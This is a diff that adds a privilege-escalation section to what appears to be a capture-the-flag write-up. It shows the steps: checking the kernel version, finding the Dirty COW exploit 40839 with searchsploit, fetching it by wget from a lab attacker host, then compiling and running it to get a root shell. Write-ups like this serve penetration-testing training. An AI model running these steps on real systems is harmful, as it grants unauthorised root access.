@@ -107,6 +107,28 @@ User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/boo
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ab0a4080-0c44-44b8-8073-e4f321d78fc9)
 
+## Privilege Escalation
+
+### 1.Method:
++ Check kernel version: `uname -a`
++ `searchsploit dirty`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/56ba4843-5761-4104-aec6-e2c4ee4535a7)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/85e1e1bd-fd8a-4916-9ddf-1b6740cd54d3)
+
++ Get the exploit: `searchsploit -m 40839`
++ Transfer the exploit, and compile:
+```
+wget 10.10.14.6:8000/40839.c
+gcc -pthread 40839.c -o exploit -lcrypt
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bdd5132d-5749-4b57-a567-1ed25b8bade2)
+
++ Run the exploit, and get root shell: `./exploit`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9c9a866b-e555-4cb2-b6b6-d95a75651378)
 
 
 
